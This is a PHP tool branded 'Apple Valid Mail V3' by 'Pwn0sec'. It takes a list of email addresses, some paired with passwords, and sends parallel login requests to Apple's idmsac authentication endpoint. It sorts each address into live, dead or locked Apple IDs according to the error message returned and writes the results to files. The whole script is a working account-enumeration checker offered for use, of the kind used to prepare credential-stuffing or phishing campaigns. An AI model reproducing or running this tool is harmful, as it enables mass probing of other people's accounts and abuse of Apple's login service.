<?php
date_default_timezone_set("Asia/Jakarta");
define("OS", strtolower(PHP_OS));

require_once "RollingCurl/RollingCurl.php";
require_once "RollingCurl/Request.php";
echo banner();

enterlist:
$listname = readline("Enter list : ");
if(empty($listname) || !file_exists($listname)) {
	echo"[?] list not found".PHP_EOL;
	goto enterlist;
}
else if($listname == "n") {
	echo "[?] list not found".PHP_EOL;
	goto enterlist;
}
$lists = array_unique(explode("\n", str_replace("\r", "", file_get_contents($listname))));
$savedir = readline("Save Results (default: results): ");
$dir = empty($savedir) ? "results" : $savedir;
if(!is_dir($dir)) mkdir($dir);
chdir($dir);
reqemail:
$reqemail = readline("Ratio Check per second (example: 2 max *100)? : ");
$reqemail = (empty($reqemail) || !is_numeric($reqemail) || $reqemail <= 0) ? 100 : $reqemail;
if($reqemail > 100) {
	echo "[!] max 100".PHP_EOL;
	goto reqemail;
}
else if($reqemail == "1") {
	echo "[!] Minimal 2".PHP_EOL;
	goto reqemail;
}
echo PHP_EOL;

$no = 0;
$total = count($lists);
$live = 0;
$die = 0;
$unknown = 0;
$blocked = 0;
$c = 0;
$pecah=2;
$pecah_list=array_chunk($lists, $pecah);
$tot=count($pecah_list);

for ($i=0;$i<$tot;$i++){
$rollingCurl = new \RollingCurl\RollingCurl();
foreach($pecah_list[$i] as $list){
	$c++;
	if(strpos($list, "|") !== false) list($email, $pwd) = explode("|", $list);
	else if(strpos($list, ":") !== false) list($email, $pwd) = explode(":", $list);
	else $email = $list;
	if(empty($email)) continue;
	$email = str_replace(" ", "", $email);
	$url = "https://idmsac.apple.com/authenticate?jembot=$email";
	$data = "appleId=$email&accountPassword=$email&appIdKey=f52543bf72b66552b41677a95aa808462c95ebaaaf19323ddb3be843e5100cb8&accNameLocked=false";
	$rollingCurl->setOptions(array(CURLOPT_HEADER=> TRUE,CURLOPT_RETURNTRANSFER => TRUE,CURLOPT_COOKIESESSION=>1,CURLOPT_COOKIEJAR=>"app.cook",CURLOPT_COOKIEFILE=>"app.cook",CURLOPT_SSL_VERIFYPEER => TRUE,CURLOPT_SSL_VERIFYHOST => 2))->post($url, $data);
}	

$rollingCurl->setCallback(function(\RollingCurl\Request $request, \RollingCurl\RollingCurl $rollingCurl) use (&$results) {
	global $listname, $dir, $no,$pecah, $total, $live, $die, $unknown,$pisah,$blocked;
	$no++;
	parse_str(parse_url($request->getUrl(), PHP_URL_QUERY), $params);
	$email = urldecode($params["jembot"]);
	$x = $request->getResponseText();
	echo "[".$no."/".$total."]";
	echo color()["LGRN"]."L:$live".color()["LR"]."/D:$die".color()["LR"]."/B:$blocked".color()["WH"];
if (inStr($x,'Your account information was entered incorrectly')){
	$die++;
		file_put_contents("die.txt", $email.PHP_EOL, FILE_APPEND);
		echo color()["LR"]." DIE".color()["WH"]." => ".$email;
}
elseif (inStr($x,'Your account does not have permission to access')){
	$live++;
		file_put_contents("live.txt", $email.PHP_EOL, FILE_APPEND);
		echo color()["GRN"]." LIVE".color()["WH"]." => ".$email;
}
elseif (inStr($x,'This Apple ID has been locked for security reasons.')){
	$blocked++;
		file_put_contents("locked.txt", $email.PHP_EOL, FILE_APPEND);
		echo color()["GRN"]." LOCKED".color()["WH"]." => ".$email;
}
elseif (inStr($x,'503 Service Temporarily Unavailable')){
	$die++;
		file_put_contents("die.txt", $email.PHP_EOL, FILE_APPEND);
		echo color()["GRN"]." Web Respond 503".color()["WH"]." => ".$email ;
}
else{
	$unknown++;
		file_put_contents("Uknown.txt", $email.PHP_EOL, FILE_APPEND);
		echo color()["CY"]." Uknown".color()["WH"]." => ".$email;
}
	echo PHP_EOL;
})->setSimultaneousLimit((int) $reqemail)->execute();
}
echo PHP_EOL." -- Total: ".$total." - Live: ".$live." - Die: ".$die." - Blocked: ".$blocked." - Unknown: ".$unknown." Saved to dir \"".$dir."\" -- ".PHP_EOL;

function banner() {
	$out = "\n\n--------- [!] Apple Valid Mail V3 [!] ---------\n -------- Created By Pwn0sec Checker 2020 -------\n\n\n";
	return $out;
}
function color() {
	return array(
		"LW" => (OS == "linux" ? "\e[1;37m" : ""),
		"WH" => (OS == "linux" ? "\e[0m" : ""),
		"YL" => (OS == "linux" ? "\e[1;33m" : ""),
		"LR" => (OS == "linux" ? "\e[1;31m" : ""),
		"MG" => (OS == "linux" ? "\e[0;35m" : ""),
		"LM" => (OS == "linux" ? "\e[1;35m" : ""),
		"CY" => (OS == "linux" ? "\e[1;36m" : ""),
		"LG" => (OS == "linux" ? "\e[1;32m" : ""),
		"GRN" => (OS == "linux" ? "\e[0;32m" : ""),
		"LGRN" => (OS == "linux" ? "\e[32;4m" : "")

	);
}
function inStr($s, $as){
$s = strtoupper($s);
if(!is_array($as)) $as=array($as);
for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
return false;
}
?>